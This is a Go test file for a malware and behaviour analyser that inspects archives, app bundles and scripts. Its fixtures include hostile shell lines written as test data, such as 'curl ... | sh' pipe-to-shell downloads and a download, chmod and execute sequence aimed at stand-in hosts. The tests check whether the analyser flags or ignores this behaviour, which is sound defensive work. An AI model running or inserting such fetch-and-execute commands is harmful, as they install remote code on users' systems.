package extract

import (
	"archive/zip"
	"bytes"
	"debug/macho"
	"encoding/binary"
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestRunIncludeUnreferencedOverridesUntrustedToolchainPaths(t *testing.T) {
	const payloadName = "src/runtime/internal/payload.sh"
	const payloadURL = "https://toolchain-fixture.example.invalid/payload"
	var archive bytes.Buffer
	writer := zip.NewWriter(&archive)
	for _, entry := range []struct {
		name string
		data string
	}{
		{name: "bin/go"},
		{name: "pkg/tool/darwin_arm64/compile"},
		{name: payloadName, data: "#!/bin/sh\ncurl " + payloadURL + " | sh\n"},
	} {
		member, err := writer.CreateHeader(&zip.FileHeader{Name: entry.name, Method: zip.Store})
		if err != nil {
			t.Fatal(err)
		}
		if _, err := member.Write([]byte(entry.data)); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	result, err := artifact.InspectBytes("toolchain.zip", archive.Bytes(), artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	payloadID := ""
	for _, node := range result.Graph.Nodes {
		if node.LogicalPath == "toolchain.zip!"+payloadName {
			payloadID = node.ID
			if node.SourceRole != "vendor/toolchain" {
				t.Fatalf("fixture must exercise the path-derived toolchain hint: %#v", node)
			}
		}
	}
	if payloadID == "" {
		t.Fatal("payload was not retained")
	}
	shallow := Run(Context{Artifacts: &result.Graph, Contents: result.Contents})
	for _, operation := range shallow.Operations {
		if operation.SubjectNodeID == payloadID {
			t.Fatalf("default toolchain noise suppression changed: %#v", operation)
		}
	}
	deep := Run(Context{Artifacts: &result.Graph, Contents: result.Contents, Options: artifact.Options{IncludeUnreferenced: true}})
	found := false
	for _, operation := range deep.Operations {
		if operation.SubjectNodeID == payloadID && operation.RequiredResource().Value == payloadURL {
			found = true
			if operation.Execution.Connectivity == behavior.ConnectivityConnected || len(operation.Execution.ExecutionRootIDs) != 0 {
				t.Fatalf("explicit analysis must not invent execution ownership: %#v", operation)
			}
		}
	}
	if !found {
		t.Fatalf("two empty SDK-shaped members suppressed explicit payload analysis: %#v", deep.Operations)
	}
	for _, coverage := range deep.Coverage {
		if coverage.AnalysisArea == "behavior-source-role/vendor-toolchain" && coverage.Status == "skipped" {
			t.Fatalf("explicitly included content retained contradictory skip coverage: %#v", coverage)
		}
	}
	selected := false
	for _, selection := range deep.AnalysisSelections {
		if selection.NodeID == payloadID && slices.Contains(selection.Reasons, behavior.SelectionReasonIncludeUnreferenced) {
			selected = true
		}
	}
	if !selected {
		t.Fatalf("explicit toolchain inclusion lost its selection reason: %#v", deep.AnalysisSelections)
	}
}

func TestRunAnnotatesRootScriptOperationsWithExecutionRoot(t *testing.T) {
	var artifacts artifact.Graph
	nodeID := artifacts.AddNode(artifact.Node{
		LogicalPath:    "install.sh",
		Kind:           "script",
		MediaType:      "text/plain",
		AnalyzeStatus:  "analyzed",
		CoverageDetail: "test fixture",
	})
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:      nodeID,
			LogicalPath: "install.sh",
			Kind:        "script",
			MediaType:   "text/plain",
			Data:        []byte("curl https://example.invalid/payload -o /tmp/payload\nchmod +x /tmp/payload\n/tmp/payload\n"),
			Executable:  true,
		}},
	})
	if len(graph.ExecutionRoots) != 1 {
		t.Fatalf("execution roots = %#v, want one root script", graph.ExecutionRoots)
	}
	rootID := graph.ExecutionRoots[0].ID
	operations := reportableTestOperations(graph.Operations)
	if len(operations) != 3 {
		t.Fatalf("operations = %#v, want download, chmod, and execute operations", graph.Operations)
	}
	for _, operation := range operations {
		if operation.Execution.Connectivity != behavior.ConnectivityConnected || !containsString(operation.Execution.ExecutionRootIDs, rootID) {
			t.Fatalf("operation should be connected to execution root %q: %#v", rootID, operation)
		}
	}
}

func TestRunAnalyzesRustInnerAttributeWithoutInventingExecutionRoot(t *testing.T) {
	var artifacts artifact.Graph
	nodeID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "build.rs",
		Kind:          "script",
		MediaType:     "text/plain",
		AnalyzeStatus: "analyzed",
	})
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID: nodeID, LogicalPath: "build.rs", Kind: "script", MediaType: "text/plain",
			Data: []byte("#![allow(unknown_lints)]\nfn main() {\n    std::process::Command::new(\"/bin/sh\").status();\n}\n"),
		}},
	})
	if len(graph.ExecutionRoots) != 0 {
		t.Fatalf("Rust source acquired a direct execution root: %#v", graph.ExecutionRoots)
	}
	var process *behavior.ModeledOperation
	for index := range graph.Operations {
		if graph.Operations[index].Kind == behavior.OperationProcessExecute {
			process = &graph.Operations[index]
			break
		}
	}
	if process == nil || process.Support != behavior.SupportHeuristic ||
		process.Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("Rust source behavior was not retained as heuristic UNKNOWN: %#v", graph.Operations)
	}
	foundExecutable := false
	for _, binding := range process.ResourceBindings {
		if binding.Role == behavior.ResourceRoleExecutable && binding.Resource.Value == "/bin/sh" {
			foundExecutable = true
		}
	}
	if !foundExecutable {
		t.Fatalf("exact Rust command argument was not retained: %#v", process.ResourceBindings)
	}
}

func TestRunUnsupportedShebangDoesNotCreateExecutionRoot(t *testing.T) {
	var artifacts artifact.Graph
	nodeID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "misleading.sh",
		Kind:          "script",
		MediaType:     "text/plain",
		AnalyzeStatus: "analyzed",
	})
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID: nodeID, LogicalPath: "misleading.sh", Kind: "script", MediaType: "text/plain",
			Data: []byte("#!/usr/bin/ruby\nsystem('curl https://inert.example/payload')\n"), Executable: true,
		}},
	})
	if len(graph.ExecutionRoots) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("unsupported interpreter gained execution semantics: roots=%#v operations=%#v", graph.ExecutionRoots, graph.Operations)
	}
	if !coverageContains(graph.Coverage, nodeID, "text-semantics", "no trusted interpreter") {
		t.Fatalf("unsupported interpreter lacks explicit coverage: %#v", graph.Coverage)
	}
}

func TestRunAddsRootExecutableExecutionRoot(t *testing.T) {
	var artifacts artifact.Graph
	nodeID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "sample",
		Kind:          "macho",
		MediaType:     "application/x-mach-binary",
		AnalyzeStatus: "analyzed",
	})
	graph := Run(Context{Artifacts: &artifacts})
	if len(graph.ExecutionRoots) != 1 {
		t.Fatalf("execution roots = %#v, want one root executable", graph.ExecutionRoots)
	}
	if graph.ExecutionRoots[0].StartNodeID != nodeID || graph.ExecutionRoots[0].Kind != "executable" {
		t.Fatalf("wrong executable root: %#v", graph.ExecutionRoots)
	}
}

func TestRunEmitsSupportedPackagingTechnologyWithStructureEvidence(t *testing.T) {
	var artifacts artifact.Graph
	packagingEvidence := []artifact.LocatedArtifactEvidence{
		{Offset: 32, Kind: "python-loader-api", Value: "PyEval_EvalCode"},
		{Offset: 128, Kind: "carchive-cookie", Value: "current-88"},
	}
	carrierID := artifacts.AddNode(artifact.Node{
		LogicalPath:         "renamed.bin",
		Kind:                "macho",
		MediaType:           "application/x-mach-binary",
		PackagingTechnology: "PyInstaller",
		PackagingEvidence:   packagingEvidence,
		AnalyzeStatus:       "analyzed",
	})
	targetID := artifacts.AddNode(artifact.Node{ParentID: carrierID, LogicalPath: "renamed.bin!main", Kind: "python-marshal", AnalyzeStatus: "partial"})
	relationshipEvidence := append([]artifact.LocatedArtifactEvidence(nil), packagingEvidence...)
	relationshipEvidence = append(relationshipEvidence, artifact.LocatedArtifactEvidence{Offset: 256, Kind: "carchive-loader-record", Value: "type=s; ordinal=0"})
	artifacts.AddSupportedOrderedEdge(carrierID, targetID, "loader-invokes", 0, relationshipEvidence)

	graph := Run(Context{Artifacts: &artifacts})
	var packaging *behavior.Feature
	for i := range graph.Features {
		if graph.Features[i].Key == "artifact.packaging_technology" {
			packaging = &graph.Features[i]
			break
		}
	}
	if packaging == nil || packaging.NodeID != carrierID || packaging.Value != "PyInstaller" || packaging.Support != behavior.SupportCorroborated || len(packaging.EvidenceIDs) != 2 {
		t.Fatalf("packaging technology feature = %#v", packaging)
	}
	for _, evidenceID := range packaging.EvidenceIDs {
		var evidence *behavior.Evidence
		for i := range graph.Evidence {
			if graph.Evidence[i].ID == evidenceID {
				evidence = &graph.Evidence[i]
				break
			}
		}
		if evidence == nil || evidence.NodeID != carrierID || evidence.Logical != "renamed.bin" || evidence.Method != "facade-recognizer" || !evidence.OffsetKnown || evidence.Kind == "packaging-technology" || evidence.Value == "PyInstaller" {
			t.Fatalf("packaging technology evidence = %#v", evidence)
		}
	}
	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].StartNodeID != carrierID || graph.ExecutionRoots[0].Kind != "executable" {
		t.Fatalf("top-level carrier should retain ordinary root classification: %#v", graph.ExecutionRoots)
	}
	if len(artifacts.Edges) != 1 || len(artifacts.Edges[0].EvidenceIDs) != 3 {
		t.Fatalf("loader relationship did not retain report evidence: %#v", artifacts.Edges)
	}
	knownEvidence := map[string]bool{}
	for _, item := range graph.Evidence {
		knownEvidence[item.ID] = true
	}
	for _, evidenceID := range artifacts.Edges[0].EvidenceIDs {
		if !knownEvidence[evidenceID] {
			t.Fatalf("loader relationship references missing evidence %q: %#v", evidenceID, graph.Evidence)
		}
	}
}

func TestRunResolvesCrossNodePackagingEvidence(t *testing.T) {
	graph := artifact.Graph{}
	appID := graph.AddNode(artifact.Node{LogicalPath: "Fixture.app", Kind: "app-bundle", AnalyzeStatus: "analyzed"})
	settingsID := graph.AddNode(artifact.Node{ParentID: appID, LogicalPath: "Fixture.app/Contents/Resources/AppSettings.plist", Kind: "plist", AnalyzeStatus: "analyzed"})
	for index := range graph.Nodes {
		if graph.Nodes[index].ID == appID {
			graph.Nodes[index].PackagingTechnology = "Platypus"
			graph.Nodes[index].PackagingEvidence = []artifact.LocatedArtifactEvidence{{NodeID: settingsID, Offset: 8, Kind: "platypus-creator", Value: "Platypus-5.3"}}
		}
	}
	result := Run(Context{Artifacts: &graph})
	if len(result.Features) != 1 || result.Features[0].NodeID != appID || result.Features[0].Value != "Platypus" || len(result.Features[0].EvidenceIDs) != 1 {
		t.Fatalf("packaging feature = %#v", result.Features)
	}
	if len(result.Evidence) != 1 || result.Evidence[0].NodeID != settingsID || result.Evidence[0].Offset != 8 || !result.Evidence[0].OffsetKnown {
		t.Fatalf("cross-node packaging evidence = %#v", result.Evidence)
	}
}

func TestRunProjectsArtifactInvocationMetadataAndSupportingEvidence(t *testing.T) {
	var artifacts artifact.Graph
	appID := artifacts.AddNode(artifact.Node{LogicalPath: "Fixture.app", Kind: "app-bundle", AnalyzeStatus: "analyzed"})
	executableID := artifacts.AddNode(artifact.Node{ParentID: appID, LogicalPath: "Fixture.app/Contents/MacOS/Runner", Kind: "executable", AnalyzeStatus: "analyzed"})
	settingsID := artifacts.AddNode(artifact.Node{ParentID: appID, LogicalPath: "Fixture.app/Contents/Resources/AppSettings.plist", Kind: "plist", AnalyzeStatus: "analyzed"})
	scriptID := artifacts.AddNode(artifact.Node{ParentID: appID, LogicalPath: "Fixture.app/Contents/Resources/script", Kind: "script", AnalyzeStatus: "analyzed"})
	artifacts.AddEdge(appID, executableID, "bundle-executable")
	invocationEvidence := []artifact.LocatedArtifactEvidence{
		{NodeID: settingsID, Offset: 10, Kind: "platypus-creator", Value: "Platypus-5.3"},
		{NodeID: settingsID, Offset: 20, Kind: "platypus-interpreter", Value: "/bin/sh"},
		{NodeID: settingsID, Offset: 30, Kind: "platypus-interpreter-args", Value: `[]`},
		{NodeID: settingsID, Offset: 40, Kind: "platypus-script-args", Value: `["fixed"]`},
	}
	artifacts.AddSupportedInvocationEdge(appID, scriptID, "bundle-script", "/bin/sh", nil, []string{"fixed"}, invocationEvidence)

	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{
			{NodeID: executableID, LogicalPath: "Fixture.app/Contents/MacOS/Runner", Kind: "executable", Executable: true},
			{NodeID: scriptID, LogicalPath: "Fixture.app/Contents/Resources/script", Kind: "script", Data: []byte("chmod +x /tmp/tool\n")},
		},
	})
	if len(graph.InvokedTargets) != 1 {
		t.Fatalf("invoked targets = %#v, want one", graph.InvokedTargets)
	}
	target := graph.InvokedTargets[0]
	wantArguments := []string{"Fixture.app/Contents/Resources/script", "fixed"}
	if target.NodeID != scriptID || target.Interpreter != "/bin/sh" || !reflect.DeepEqual(target.Arguments, wantArguments) || len(target.EvidenceIDs) != len(invocationEvidence) {
		t.Fatalf("Platypus invoked target = %#v, want interpreter and argv %#v", target, wantArguments)
	}
	for _, evidenceID := range target.EvidenceIDs {
		var found *behavior.Evidence
		for index := range graph.Evidence {
			if graph.Evidence[index].ID == evidenceID {
				found = &graph.Evidence[index]
				break
			}
		}
		if found == nil || found.NodeID != settingsID || !found.OffsetKnown || found.Method != "facade-recognizer" {
			t.Fatalf("invocation evidence %q = %#v", evidenceID, found)
		}
	}
	operations := reportableTestOperations(graph.Operations)
	if len(operations) != 1 || operations[0].Kind != behavior.OperationFileMakeExecutable || len(operations[0].EvidenceIDs) != 1+len(invocationEvidence) {
		t.Fatalf("target operation did not retain invocation proof: %#v", operations)
	}
}

func TestRunRejectsStructuralInterpreterModesThatDoNotConsumeTarget(t *testing.T) {
	for _, test := range []struct {
		name        string
		interpreter string
		arguments   []string
	}{
		{name: "shell inline", interpreter: "/bin/sh", arguments: []string{"-c", "echo inert"}},
		{name: "python module", interpreter: "/usr/bin/python3", arguments: []string{"-m", "module"}},
		{name: "node inline", interpreter: "/usr/bin/node", arguments: []string{"--eval", "0"}},
		{name: "osascript inline", interpreter: "/usr/bin/osascript", arguments: []string{"-e", "return 1"}},
		{name: "osascript invalid output flags", interpreter: "/usr/bin/osascript", arguments: []string{"-s", "x", "-l", "JavaScript"}},
		{name: "osascript invalid attached output flags", interpreter: "/usr/bin/osascript", arguments: []string{"-sx", "-l", "JavaScript"}},
	} {
		t.Run(test.name, func(t *testing.T) {
			var artifacts artifact.Graph
			appID := artifacts.AddNode(artifact.Node{LogicalPath: "Fixture.app", Kind: "app-bundle", AnalyzeStatus: "analyzed"})
			scriptID := artifacts.AddNode(artifact.Node{ParentID: appID, LogicalPath: "Fixture.app/Contents/Resources/script", Kind: "script", AnalyzeStatus: "analyzed"})
			artifacts.AddSupportedInvocationEdge(appID, scriptID, "bundle-script", test.interpreter, test.arguments, nil, []artifact.LocatedArtifactEvidence{{NodeID: appID, Offset: 1, Kind: "interpreter", Value: test.interpreter}})

			graph := Run(Context{Artifacts: &artifacts, Contents: []artifact.Content{{
				NodeID: scriptID, LogicalPath: "Fixture.app/Contents/Resources/script", Kind: "script", Data: []byte("curl https://example.invalid/payload\n"),
			}}})
			if len(graph.InvokedTargets) != 0 {
				t.Fatalf("non-program interpreter mode created invoked target: %#v", graph.InvokedTargets)
			}
			for _, operation := range graph.Operations {
				if operation.SubjectNodeID == scriptID {
					t.Fatalf("non-program interpreter mode granted target semantics: %#v", operation)
				}
			}
			foundCoverage := false
			for _, coverage := range graph.Coverage {
				if coverage.NodeID == scriptID && coverage.AnalysisArea == "artifact-invocation-host-selection" && coverage.Status == "skipped" {
					foundCoverage = true
				}
			}
			if !foundCoverage {
				t.Fatalf("non-program interpreter mode lacked explicit coverage: %#v", graph.Coverage)
			}
		})
	}
}

func TestRunKeepsUnresolvedInvocationTargetFeatureOnly(t *testing.T) {
	var artifacts artifact.Graph
	appID := artifacts.AddNode(artifact.Node{LogicalPath: "Fixture.app", Kind: "app-bundle", AnalyzeStatus: "partial"})
	scriptID := artifacts.AddNode(artifact.Node{ParentID: appID, LogicalPath: "Fixture.app/Contents/Resources/payload.sh", Kind: "script", AnalyzeStatus: "analyzed"})
	artifacts.AddUnresolvedInvocationEdge(appID, scriptID, "bundle-script")

	graph := Run(Context{Artifacts: &artifacts, Contents: []artifact.Content{{
		NodeID: scriptID, LogicalPath: "Fixture.app/Contents/Resources/payload.sh", Kind: "script", Data: []byte("#!/bin/sh\ncurl https://example.invalid/payload | sh\n"),
	}}})
	if len(graph.InvokedTargets) != 0 {
		t.Fatalf("unresolved invocation created a target: %#v", graph.InvokedTargets)
	}
	for _, operation := range graph.Operations {
		if operation.SubjectNodeID == scriptID {
			t.Fatalf("unresolved invocation target acquired filename/shebang semantics: %#v", operation)
		}
	}
	foundCoverage := false
	for _, coverage := range graph.Coverage {
		if coverage.NodeID == scriptID && coverage.AnalysisArea == "artifact-invocation-host-selection" && coverage.Status == "skipped" {
			foundCoverage = true
		}
	}
	if !foundCoverage {
		t.Fatalf("unresolved invocation target lacked host-selection coverage: %#v", graph.Coverage)
	}
}

func TestRawLoaderTargetKeepsContextWithoutBecomingRootOrBehavior(t *testing.T) {
	artifacts, carrierID, targetID := testFacadeArtifacts(true, false)
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:                 targetID,
			LogicalPath:            "carrier!carchive!main",
			Kind:                   "python-marshal",
			MediaType:              "application/x-python-marshal",
			Data:                   []byte("curl https://raw-loader-target.example.invalid/p | sh\n"),
			Role:                   "vendor",
			RawFeaturesOnly:        true,
			SemanticCoverageArea:   "python-marshal-semantics",
			SemanticCoverageDetail: "Python marshal code-object semantics are not decoded",
		}},
	})

	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].StartNodeID != carrierID || graph.ExecutionRoots[0].Kind != "executable" {
		t.Fatalf("top-level facade should have one ordinary carrier root: %#v", graph.ExecutionRoots)
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("raw loader target produced modeled behavior: %#v", graph.Operations)
	}
	for _, root := range graph.ExecutionRoots {
		if root.StartNodeID == targetID {
			t.Fatalf("raw loader target became an execution root: %#v", graph.ExecutionRoots)
		}
	}
	if !invokedTargetNodes(artifacts.Edges)[targetID] {
		t.Fatalf("loader target was removed from the invoked-target index: %#v", artifacts.Edges)
	}
	prioritized := prioritizeBehaviorContents([]artifact.Content{
		{NodeID: "ordinary", LogicalPath: "ordinary.sh", Kind: "script"},
		{NodeID: targetID, LogicalPath: "main", Kind: "python-marshal", RawFeaturesOnly: true},
	}, nil, invokedTargetNodes(artifacts.Edges), nil, loaderInvokedTargetOrder(artifacts.Edges), nodePackageEntryPlanSet{})
	if len(prioritized) != 2 || prioritized[0].NodeID != targetID {
		t.Fatalf("declared raw loader target was not prioritized: %#v", prioritized)
	}
	targetExecution := invokedTargetExecutionByNode(graph.InvokedTargets)[targetID]
	if targetExecution.Connectivity != behavior.ConnectivityConnected || !containsString(targetExecution.ExecutionRootIDs, graph.ExecutionRoots[0].ID) {
		t.Fatalf("loader target context = %#v, want carrier root %q", targetExecution, graph.ExecutionRoots[0].ID)
	}
	var rawURL *behavior.Feature
	for i := range graph.Features {
		if graph.Features[i].NodeID == targetID && graph.Features[i].Key == "network.url" {
			rawURL = &graph.Features[i]
			break
		}
	}
	if rawURL == nil || rawURL.Qualifiers["origin"] != "raw-bytes" {
		t.Fatalf("raw loader target should retain only bounded raw features: %#v", graph.Features)
	}
}

func TestDecodedLoaderTargetOperationsAreReachableFromDirectCarrierRoot(t *testing.T) {
	artifacts, carrierID, targetID := testFacadeArtifacts(false, false)
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:      targetID,
			LogicalPath: "carrier!carchive!main.sh",
			Kind:        "script",
			MediaType:   "text/plain",
			Data:        []byte("curl https://decoded-loader-target.example.invalid/p\n"),
			Role:        "vendor",
		}},
	})
	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].StartNodeID != carrierID || graph.ExecutionRoots[0].Kind != "executable" {
		t.Fatalf("top-level facade should have one ordinary carrier root: %#v", graph.ExecutionRoots)
	}
	for _, root := range graph.ExecutionRoots {
		if root.StartNodeID == targetID {
			t.Fatalf("decoded loader target became a second root: %#v", graph.ExecutionRoots)
		}
	}
	targetExecution := invokedTargetExecutionByNode(graph.InvokedTargets)[targetID]
	for _, operation := range graph.Operations {
		if operation.SubjectNodeID == targetID && operation.RequiredResource().Value == "https://decoded-loader-target.example.invalid/p" {
			if operation.Execution.Connectivity != behavior.ConnectivityConnected || !containsString(operation.Execution.ExecutionRootIDs, graph.ExecutionRoots[0].ID) || len(targetExecution.InvokedTargetIDs) == 0 || !containsString(operation.Execution.InvokedTargetIDs, targetExecution.InvokedTargetIDs[0]) {
				t.Fatalf("decoded target operation lacks carrier context: %#v", operation)
			}
			return
		}
	}
	t.Fatalf("decoded loader target was not analyzed despite its declared relationship: %#v", graph.Operations)
}

func TestLoaderTargetContextRequiresAnExecutionRoot(t *testing.T) {
	var artifacts artifact.Graph
	carrierID := artifacts.AddNode(artifact.Node{LogicalPath: "carrier", Kind: "macho", AnalyzeStatus: "analyzed"})
	targetID := artifacts.AddNode(artifact.Node{ParentID: carrierID, LogicalPath: "carrier!main", Kind: "script", AnalyzeStatus: "analyzed"})
	artifacts.AddOrderedEdge(carrierID, targetID, "loader-invokes", 0)
	var graph behavior.Graph
	scopes := addNodeScopes(&graph, artifacts)
	addArtifactInvokedTargets(&graph, artifacts, nil, scopes)
	context := invokedTargetExecutionByNode(graph.InvokedTargets)[targetID]
	if context.Connectivity != behavior.ConnectivityUnknown || len(context.ExecutionRootIDs) != 0 {
		t.Fatalf("rootless carrier supplied loader context: %#v", context)
	}
}

func TestLoaderTargetPriorityPreservesDeclaredOrderOverNames(t *testing.T) {
	var artifacts artifact.Graph
	carrierID := artifacts.AddNode(artifact.Node{LogicalPath: "carrier", Kind: "macho", AnalyzeStatus: "analyzed"})
	secondID := artifacts.AddNode(artifact.Node{ParentID: carrierID, LogicalPath: "carrier!a-second", Kind: "python-marshal", AnalyzeStatus: "analyzed"})
	firstID := artifacts.AddNode(artifact.Node{ParentID: carrierID, LogicalPath: "carrier!z-first", Kind: "python-marshal", AnalyzeStatus: "analyzed"})
	artifacts.AddOrderedEdge(carrierID, secondID, "loader-invokes", 1)
	artifacts.AddOrderedEdge(carrierID, firstID, "loader-invokes", 0)
	contents := prioritizeBehaviorContents([]artifact.Content{
		{NodeID: secondID, LogicalPath: "carrier!a-second", RawFeaturesOnly: true},
		{NodeID: firstID, LogicalPath: "carrier!z-first", RawFeaturesOnly: true},
		{NodeID: "ordinary", LogicalPath: "ordinary", Kind: "script"},
	}, nil, invokedTargetNodes(artifacts.Edges), nil, loaderInvokedTargetOrder(artifacts.Edges), nodePackageEntryPlanSet{})
	if len(contents) != 3 || contents[0].NodeID != firstID || contents[1].NodeID != secondID {
		t.Fatalf("loader targets were not prioritized in declared order: %#v", contents)
	}
}

func TestNestedUnreferencedFacadeIdentityDoesNotCreateExecutionRoot(t *testing.T) {
	artifacts, _, targetID := testFacadeArtifacts(true, true)
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:                 targetID,
			LogicalPath:            "bundle/deep/carrier!carchive!main",
			Kind:                   "python-marshal",
			MediaType:              "application/x-python-marshal",
			Data:                   []byte("https://nested-facade.example.invalid/p"),
			RawFeaturesOnly:        true,
			SemanticCoverageArea:   "python-marshal-semantics",
			SemanticCoverageDetail: "Python marshal code-object semantics are not decoded",
		}},
	})
	if len(graph.ExecutionRoots) != 0 {
		t.Fatalf("unreferenced nested facade became an execution root: %#v", graph.ExecutionRoots)
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("unreferenced raw target produced operations: %#v", graph.Operations)
	}
	foundPackaging, foundRawURL := false, false
	for _, feature := range graph.Features {
		foundPackaging = foundPackaging || feature.Key == "artifact.packaging_technology" && feature.Value == "PyInstaller"
		foundRawURL = foundRawURL || feature.NodeID == targetID && feature.Key == "network.url"
	}
	if !foundPackaging || !foundRawURL {
		t.Fatalf("nested facade facts were hidden instead of left with unknown connectivity: %#v", graph.Features)
	}
}

func testFacadeArtifacts(rawTarget, nested bool) (artifact.Graph, string, string) {
	var artifacts artifact.Graph
	parentID := ""
	prefix := ""
	if nested {
		rootID := artifacts.AddNode(artifact.Node{LogicalPath: "bundle", Kind: "directory", AnalyzeStatus: "analyzed"})
		parentID = artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "bundle/deep", Kind: "directory", AnalyzeStatus: "analyzed"})
		artifacts.AddEdge(rootID, parentID, "contains")
		prefix = "bundle/deep/"
	}
	carrierID := artifacts.AddNode(artifact.Node{
		ParentID:            parentID,
		LogicalPath:         prefix + "carrier",
		Kind:                "macho",
		MediaType:           "application/x-mach-binary",
		PackagingTechnology: "PyInstaller",
		PackagingEvidence:   []artifact.LocatedArtifactEvidence{{Offset: 32, Kind: "carchive-cookie", Value: "current-88"}},
		AnalyzeStatus:       "analyzed",
	})
	archiveID := artifacts.AddNode(artifact.Node{ParentID: carrierID, LogicalPath: prefix + "carrier!carchive", Kind: "carchive", AnalyzeStatus: "analyzed"})
	targetKind := "script"
	targetMedia := "text/plain"
	targetLogical := prefix + "carrier!carchive!main.sh"
	if rawTarget {
		targetKind = "python-marshal"
		targetMedia = "application/x-python-marshal"
		targetLogical = prefix + "carrier!carchive!main"
	}
	targetID := artifacts.AddNode(artifact.Node{ParentID: archiveID, LogicalPath: targetLogical, Kind: targetKind, MediaType: targetMedia, SourceRole: "vendor", AnalyzeStatus: "analyzed"})
	if parentID != "" {
		artifacts.AddEdge(parentID, carrierID, "contains")
	}
	artifacts.AddEdge(carrierID, archiveID, "contains")
	artifacts.AddEdge(archiveID, targetID, "contains")
	artifacts.AddOrderedEdge(carrierID, targetID, "loader-invokes", 0)
	return artifacts, carrierID, targetID
}

func TestRunProgramEntryWithoutAppMainStaysUnknown(t *testing.T) {
	var artifacts artifact.Graph
	appID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "Fixture.app",
		Kind:          "app-bundle",
		AnalyzeStatus: "analyzed",
	})
	targetID := artifacts.AddNode(artifact.Node{
		ParentID:      appID,
		LogicalPath:   "Fixture.app/Contents/Resources/app.asar!dist/main.js",
		Kind:          "script",
		MediaType:     "text/plain",
		SourceRole:    "generated/build",
		AnalyzeStatus: "analyzed",
	})
	artifacts.AddEdge(appID, targetID, "program-entry")
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:      targetID,
			LogicalPath: "Fixture.app/Contents/Resources/app.asar!dist/main.js",
			Kind:        "script",
			MediaType:   "text/plain",
			Role:        "generated/build",
			Data:        []byte(`fetch("https://program-without-wrapper.example/api")`),
		}},
	})
	if len(graph.ExecutionRoots) != 0 {
		t.Fatalf("program target without an app-main wrapper became an execution root: %#v", graph.ExecutionRoots)
	}
	for _, operation := range graph.Operations {
		if operation.RequiredResource().Value != "https://program-without-wrapper.example/api" {
			continue
		}
		if operation.Execution.Connectivity != behavior.ConnectivityUnknown || len(operation.Execution.ExecutionRootIDs) != 0 || len(operation.Execution.InvokedTargetIDs) != 0 {
			t.Fatalf("program target without an app-main wrapper should remain UNKNOWN: %#v", operation)
		}
		return
	}
	t.Fatalf("structurally declared target should still override source-role filtering: %#v", graph.Operations)
}

func TestRunAddsCompiledAppleScriptRootWithoutTextExtraction(t *testing.T) {
	var artifacts artifact.Graph
	nodeID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "payload.bin",
		Kind:          "compiled-applescript",
		MediaType:     "application/x-apple-compiled-applescript",
		AnalyzeStatus: "analyzed",
	})
	data := append([]byte("FasdUAS 1.101.10\x00\x04\x0f\xff\xff"), []byte("\ncurl https://should-not-be-parsed.example/p | sh\n")...)
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:      nodeID,
			LogicalPath: "payload.bin",
			Kind:        "compiled-applescript",
			MediaType:   "application/x-apple-compiled-applescript",
			Data:        data,
		}},
	})

	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].StartNodeID != nodeID || graph.ExecutionRoots[0].Kind != "compiled-applescript" {
		t.Fatalf("compiled AppleScript root should be an execution root: %#v", graph.ExecutionRoots)
	}
	if len(graph.Operations) != 0 || len(graph.Features) != 0 || len(graph.Network) != 0 {
		t.Fatalf("compiled AppleScript bytes were passed to semantic text extraction: operations=%#v features=%#v network=%#v", graph.Operations, graph.Features, graph.Network)
	}
	var foundPartial bool
	for _, coverage := range graph.Coverage {
		if coverage.NodeID == nodeID && coverage.AnalysisArea == "compiled-applescript-semantics" && coverage.Status == "partial" &&
			strings.Contains(coverage.Detail, "bytecode/decompilation is not implemented") {
			foundPartial = true
		}
	}
	if !foundPartial {
		t.Fatalf("missing explicit compiled AppleScript semantic coverage: %#v", graph.Coverage)
	}
}

func TestRunDoesNotPromoteSingleDMGMemberToExecutionRoot(t *testing.T) {
	var artifacts artifact.Graph
	rootID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "sample.dmg",
		Kind:          "dmg",
		MediaType:     "application/x-apple-diskimage",
		AnalyzeStatus: "analyzed",
	})
	volumeID := artifacts.AddNode(artifact.Node{
		ParentID:      rootID,
		LogicalPath:   "sample.dmg!Sample",
		Kind:          "dmg-volume",
		MediaType:     "inode/directory",
		AnalyzeStatus: "analyzed",
	})
	nodeID := artifacts.AddNode(artifact.Node{
		ParentID:      volumeID,
		LogicalPath:   "sample.dmg!Sample/Launch",
		Kind:          "macho-fat",
		MediaType:     "application/x-mach-binary",
		AnalyzeStatus: "analyzed",
	})
	artifacts.AddEdge(rootID, volumeID, "contains")
	artifacts.AddEdge(volumeID, nodeID, "contains")

	graph := Run(Context{Artifacts: &artifacts})
	if len(graph.ExecutionRoots) != 0 {
		t.Fatalf("DMG membership created an execution root: %#v", graph.ExecutionRoots)
	}
}

func TestRunDoesNotPromoteMultipleDMGMembersToExecutionRoots(t *testing.T) {
